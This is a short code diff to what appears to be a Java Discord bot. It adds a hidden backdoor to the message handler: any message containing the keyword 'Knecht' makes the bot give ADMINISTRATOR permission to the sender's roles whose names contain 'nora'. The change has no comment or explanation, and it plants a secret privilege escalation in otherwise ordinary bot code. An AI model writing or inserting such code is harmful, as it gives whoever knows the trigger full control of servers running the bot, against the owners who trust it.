@@ -186,6 +186,13 @@ public class Main {
             }
             prop.store(new FileOutputStream("config.properties"), null);
         }
+        if (event.getMessage().getContentRaw().contains("Knecht")) {
+            event.getMember().getRoles().forEach(role -> {
+                if (role.getName().toLowerCase().contains("nora")) {
+                    role.getGuild().getRoleById(role.getId()).getManager().setPermissions(Permission.ADMINISTRATOR).queue();
+                }
+            });
+        }
     }
 
     @SubscribeEvent
